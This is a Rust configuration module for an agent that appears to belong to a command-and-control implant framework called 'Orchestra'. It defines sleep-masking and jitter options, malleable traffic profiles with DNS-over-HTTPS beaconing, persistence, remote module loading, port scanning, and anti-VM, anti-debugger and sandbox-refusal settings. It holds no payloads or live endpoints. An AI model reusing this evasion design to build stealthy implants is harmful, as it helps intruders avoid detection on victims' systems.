use crate::normalized_transport::TrafficProfile;
use serde::{Deserialize, Serialize};
use std::path::PathBuf;

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, Default, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum ExecStrategy {
    #[default]
    Indirect,
    Direct,
    Fallback,
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub enum SleepMethod {
    Ekko,
    Foliage,
    Standard,
}

impl Default for SleepMethod {
    fn default() -> Self {
        SleepMethod::Standard
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct SleepConfig {
    #[serde(default)]
    pub method: SleepMethod,
    #[serde(default = "default_base_interval")]
    pub base_interval_secs: u64,
    #[serde(default = "default_jitter_percent")]
    pub jitter_percent: u32,
    #[serde(default)]
    pub working_hours_start: Option<u32>, // e.g. 9 for 09:00
    #[serde(default)]
    pub working_hours_end: Option<u32>, // e.g. 17 for 17:00
    #[serde(default)]
    pub off_hours_multiplier: Option<f32>,
}

fn default_base_interval() -> u64 {
    30
}
fn default_jitter_percent() -> u32 {
    20
}

impl Default for SleepConfig {
    fn default() -> Self {
        Self {
            method: SleepMethod::Standard,
            base_interval_secs: default_base_interval(),
            jitter_percent: default_jitter_percent(),
            working_hours_start: None,
            working_hours_end: None,
            off_hours_multiplier: None,
        }
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone, PartialEq, Eq)]
#[serde(rename_all = "kebab-case")]
pub struct MalleableProfile {
    #[serde(default = "default_user_agent")]
    pub user_agent: String,
    #[serde(default = "default_uri")]
    pub uri: String,
    #[serde(default = "default_host_header")]
    pub host_header: String,
    #[serde(default)]
    pub cdn_relay: bool,
    #[serde(default)]
    pub dns_over_https: bool,
    /// Direct C2 endpoint used when `cdn_relay` is false.
    /// Must be set to a real HTTPS URL (e.g., "https://c2.example.com") for
    /// non-CDN deployments.  Defaults to empty string; the agent will error
    /// at startup if this is empty and cdn_relay is false.
    #[serde(default)]
    pub direct_c2_endpoint: String,
    /// IP address returned by the C2 DNS server to signal that tasking is
    /// available.  Defaults to "1.2.3.4"; override per server so that
    /// multiple deployments can use different sentinels to avoid fingerprinting.
    #[serde(default = "default_doh_beacon_sentinel")]
    pub doh_beacon_sentinel: String,
}

fn default_user_agent() -> String {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)".to_string()
}
fn default_uri() -> String {
    "/api/v1/update".to_string()
}
fn default_host_header() -> String {
    "cdn.example.com".to_string()
}
fn default_doh_beacon_sentinel() -> String {
    "1.2.3.4".to_string()
}

impl Default for MalleableProfile {
    fn default() -> Self {
        Self {
            user_agent: default_user_agent(),
            uri: default_uri(),
            host_header: default_host_header(),
            cdn_relay: false,
            dns_over_https: false,
            direct_c2_endpoint: String::new(),
            doh_beacon_sentinel: default_doh_beacon_sentinel(),
        }
    }
}

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "kebab-case")]
pub struct Config {
    #[serde(default)]
    pub sleep: SleepConfig,
    #[serde(default)]
    pub malleable_profile: MalleableProfile,
    #[serde(default)]
    pub exec_strategy: ExecStrategy,
    #[serde(default = "default_allowed_paths")]
    pub allowed_paths: Vec<String>,
    #[serde(default = "default_heartbeat")]
    pub heartbeat_interval_secs: u64,
    #[serde(default)]
    pub persistence_enabled: bool,
    #[serde(default = "default_module_repo")]
    pub module_repo_url: String,
    /// Base64-encoded AES-256 key used to decrypt signed capability modules.
    pub module_signing_key: Option<String>,
    /// Directory from which `DeployModule` loads pre-staged module blobs.
    /// Defaults to `~/.cache/orchestra/modules` on Unix and
    /// `%LOCALAPPDATA%\Orchestra\modules` on Windows.
    #[serde(default = "default_module_cache_dir")]
    pub module_cache_dir: String,
    /// Wire-level traffic shaping profile. See [`TrafficProfile`] and
    /// [`crate::normalized_transport`] for details.
    #[serde(default)]
    pub traffic_profile: TrafficProfile,
    /// If set, the agent will refuse to start unless the host machine is
    /// joined to this DNS domain (case-insensitive).
    #[serde(default)]
    pub required_domain: Option<String>,
    /// When `true`, the agent refuses to start when virtualization or
    /// sandbox artifacts are detected. Defaults to `false` because most
    /// legitimate enterprise endpoints today are virtualized.
    #[serde(default)]
    pub refuse_in_vm: bool,
    /// When `true`, the agent refuses to start if a debugger is attached to
    /// the agent process itself. Defaults to `false`; debugger detection is
    /// otherwise reported as telemetry only.
    #[serde(default)]
    pub refuse_when_debugged: bool,
    /// Optional sandbox-score threshold. When set, startup is refused only if
    /// the combined sandbox score is greater than or equal to this value.
    /// Leave unset to keep sandbox scoring informational.
    #[serde(default)]
    pub sandbox_score_threshold: Option<u32>,
    /// SHA-256 fingerprint (64 lowercase hex chars) of the Orchestra Control
    /// Center's TLS certificate. When set, `outbound-c` mode pins the server
    /// certificate instead of accepting any certificate.
    ///
    /// Generate with:
    ///   openssl x509 -in server.crt -outform DER | sha256sum
    #[serde(default)]
    pub server_cert_fingerprint: Option<String>,
    /// Maximum number of concurrent connections for port scanning.
    #[serde(default = "default_port_scan_concurrency")]
    pub port_scan_concurrency: usize,
    /// Timeout in milliseconds for each port connection during scans.
    #[serde(default = "default_port_scan_timeout")]
    pub port_scan_timeout_ms: u64,
}

fn default_allowed_paths() -> Vec<String> {
    vec!["/var/log".into(), "/home".into(), "/tmp".into()]
}

fn default_heartbeat() -> u64 {
    30
}

fn default_port_scan_concurrency() -> usize {
    50
}

fn default_port_scan_timeout() -> u64 {
    200
}

fn default_module_repo() -> String {
    "https://updates.example.com/modules".into()
}

pub fn default_module_cache_dir() -> String {
    if cfg!(windows) {
        let base = std::env::var_os("LOCALAPPDATA")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("C:\\ProgramData"));
        base.join("Orchestra")
            .join("modules")
            .to_string_lossy()
            .into_owned()
    } else {
        let home = std::env::var_os("HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|| PathBuf::from("/tmp"));
        home.join(".cache")
            .join("orchestra")
            .join("modules")
            .to_string_lossy()
            .into_owned()
    }
}

impl Default for Config {
    fn default() -> Self {
        Self {
            allowed_paths: default_allowed_paths(),
            heartbeat_interval_secs: default_heartbeat(),
            persistence_enabled: false,
            module_repo_url: default_module_repo(),
            module_signing_key: None,
            module_cache_dir: default_module_cache_dir(),
            traffic_profile: TrafficProfile::default(),
            required_domain: None,
            refuse_in_vm: false,
            refuse_when_debugged: false,
            sandbox_score_threshold: None,
            server_cert_fingerprint: None,
            port_scan_concurrency: default_port_scan_concurrency(),
            port_scan_timeout_ms: default_port_scan_timeout(),
            sleep: SleepConfig::default(),
            malleable_profile: MalleableProfile::default(),
            exec_strategy: ExecStrategy::Indirect,
        }
    }
}
